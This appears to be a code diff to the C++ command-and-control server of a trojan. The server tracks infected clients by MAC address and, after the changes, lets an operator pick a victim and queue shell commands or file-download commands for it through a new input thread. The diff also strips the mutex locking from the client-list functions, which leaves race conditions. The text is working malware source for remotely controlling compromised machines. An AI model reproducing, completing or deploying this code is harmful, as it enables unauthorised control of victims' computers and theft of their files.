@@ -4,7 +4,6 @@
 #include "stdafx.h"
 #include <iostream>
 #include <winsock2.h>
-
 using namespace std;
 
 #pragma comment(lib, "ws2_32.lib")
@@ -31,7 +30,10 @@ typedef struct _TROJAN_INFO
 // remoteFile*localFile: c:\\1.txt*d:\\2.txt
 
 #define MAX_CLIENT_NUM		10
+#define NOW_CLIENT_NUM		3
 TROJAN_INFO g_trojan_info[MAX_CLIENT_NUM];
+bool inflag = 0;
+int now_client_num = 0;
 
 CRITICAL_SECTION cs;
 //EnterCriticalSection(&cs);
@@ -79,8 +81,8 @@ int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
 
 void remove_trojan_from_list(char *MacAddr)
 {
+	
 	int i = 0;
-	EnterCriticalSection(&cs);
 	for(i=0; i<MAX_CLIENT_NUM; i++)
 	{
 		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
@@ -92,7 +94,6 @@ void remove_trojan_from_list(char *MacAddr)
 			break;
 		}
 	}
-	LeaveCriticalSection(&cs);
 }
 
 void add_trojan_to_list(char *MacAddr)
@@ -100,12 +101,12 @@ void add_trojan_to_list(char *MacAddr)
 	int i = 0;
 	int free_index = -1;
     
-	EnterCriticalSection(&cs);
 	for(i=0; i<MAX_CLIENT_NUM; i++)
 	{
 		if(g_trojan_info[i].live_flag == 0)
 		{
 			free_index = i;
+			cout << i;
 			break;
 		}
 	}
@@ -118,33 +119,44 @@ void add_trojan_to_list(char *MacAddr)
 		memset(g_trojan_info[free_index].cmd, 0, MAX_CMD_LEN);
 	}
 
-	LeaveCriticalSection(&cs);
 }
 
 int get_cmd_by_mac(char *MacAddr, char *CmdBuff)
 {
 	int i = 0;
 	int CmdNo = CMD_NULL;
-	EnterCriticalSection(&cs);
 	for(i=0; i<MAX_CLIENT_NUM; i++)
 	{
 		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
 		{
 			CmdNo = g_trojan_info[i].cmd_no;
 			sprintf(CmdBuff, "%d#%s", CmdNo, g_trojan_info[i].cmd);
+			g_trojan_info[i].cmd_no = CMD_NULL;
 			break;
 		}
 	}
-	LeaveCriticalSection(&cs);
 	return CmdNo;
 }
 
-void cmd(char *MacAddr)
+void cmd()
 {
 	int i = 0;
 	int free_index = -1;
+	int kind;
+	if (inflag|| now_client_num<NOW_CLIENT_NUM)return;
+	inflag = 1;
+	/*cout << "是否发送指令"  << "？(y/n)   ";
+	char a;
+	cin >> a;
+	if (a == 'y' || a == 'Y')
+	{*/
+		
 
 	EnterCriticalSection(&cs);
+
+	char  MacAddr[MAC_ADDR_LEN];
+	cout << "\n请输入要发送的客户端Mac地址： ";
+	cin >> MacAddr;
 
 	for (i = 0; i<MAX_CLIENT_NUM; i++)
 	{
@@ -155,14 +167,60 @@ void cmd(char *MacAddr)
 		}
 	}
 
-
-	cout << "是否发送指令到"<<MacAddr<<"？(y/n)   ";
-	char a;
-	int kind;
-	cin >> a;
-	if (a == 'y' || a == 'Y')
+	if (free_index != -1)
 	{
-		
+		g_trojan_info[free_index].live_flag = 1;
+		//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
+		cout << "请输入要发送的指令种类：" << endl << "1.普通指令 2.文件下载指令" << endl << "(1/2)  ";
+		cin >> kind;
+		if (kind == 1)
+		{
+			g_trojan_info[free_index].cmd_no = CMD_CMD;
+		}
+		if (kind == 2)
+		{
+			g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
+		}
+		cout << "输入要发送的指令：";
+		cin >> g_trojan_info[free_index].cmd;
+	}
+	else { cout << "客户端mac地址错误！"; }
+
+
+	/*}
+	else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/
+
+	LeaveCriticalSection(&cs);
+	inflag = 0;
+	return;
+}
+
+DWORD WINAPI InputThread(LPVOID lpParameter)
+{
+	SOCKET ClientSocket = (SOCKET)lpParameter;
+	int i = 0;
+	int free_index = -1;
+	int kind;
+	/*if (inflag || now_client_num<NOW_CLIENT_NUM)return;
+	inflag = 1;*/
+
+	while (TRUE)
+	{
+		char  MacAddr[MAC_ADDR_LEN];
+		cout << "请输入要发送的客户端Mac地址： ";
+		cin >> MacAddr;
+
+		cout << "->"<<now_client_num;
+		for (i = 0; i<MAX_CLIENT_NUM; i++)
+		{
+			cout << g_trojan_info[i].mac << endl;
+			if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
+			{
+				free_index = i;
+				break;
+			}
+		}
+
 		if (free_index != -1)
 		{
 			g_trojan_info[free_index].live_flag = 1;
@@ -180,13 +238,18 @@ void cmd(char *MacAddr)
 			cout << "输入要发送的指令：";
 			cin >> g_trojan_info[free_index].cmd;
 		}
-		else { cout << "客户端错误！"; }
+		else { cout << "客户端mac地址错误！"; }
+
+		Sleep(1000);
+		/*}
+		else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/
+
+		/*inflag = 0;
+		return;*/
 	}
-	else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }
 
-	LeaveCriticalSection(&cs);
-
-	return;
+	closesocket(ClientSocket);
+	return 0;
 }
 
 DWORD WINAPI ClientThread(LPVOID lpParameter)
@@ -200,6 +263,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 	char LocalFile[MAX_PATH];
 	char *strTmp;
 	bool bFirst = true;
+	now_client_num++;
 
 	while( TRUE )
 	{
@@ -215,12 +279,14 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		}
 		
 		if(bFirst){
+			cout << "添加到木马列表" << endl;
 			remove_trojan_from_list(RecvBuffer);
 			add_trojan_to_list(RecvBuffer);
 			bFirst = false;
 		}
 
-		cmd(RecvBuffer);
+		//cmd(RecvBuffer);
+		
 		
 		// check if the trojan has an cmd to do
 		memset(CmdBuff, 0, MAX_CMD_LEN);
@@ -236,7 +302,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		switch(CmdNo)
 		{
 		case CMD_NULL:
-			cout << "暂时未发送命令！\n";
+			//cout << "暂时未发送命令！\n";
 			CmdLen = 0;
 			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
 			break;
@@ -335,6 +401,7 @@ int main(int argc, char* argv[])
 	int Ret = 0;
 	int AddrLen = 0;
 	HANDLE hThread = NULL;
+	HANDLE inThread = NULL;
 
 	init();
 
@@ -375,6 +442,13 @@ int main(int argc, char* argv[])
 
 	cout<<"服务端已经启动"<<endl;
 
+
+	inThread = CreateThread(NULL, 0, InputThread, (LPVOID)ServerSocket, 0, NULL);
+	if (inThread == NULL)
+	{
+		cout << "Create Thread Failed!" << endl;
+	}
+
 	while ( true )
 	{
 		AddrLen = sizeof(ClientAddr);
@@ -384,6 +458,7 @@ int main(int argc, char* argv[])
 			cout<<"Accept Failed::"<<GetLastError()<<endl;
 			break;
 		}
+
 
 		cout << "\n\n客户端连接::" << inet_ntoa(ClientAddr.sin_addr)<<":" << ClientAddr.sin_port << endl;
 
@@ -399,6 +474,7 @@ int main(int argc, char* argv[])
 
 	Sleep(INFINITE);
 
+	CloseHandle(inThread);
 	closesocket(ServerSocket);
 	//closesocket(ClientSocket);
 	WSACleanup();
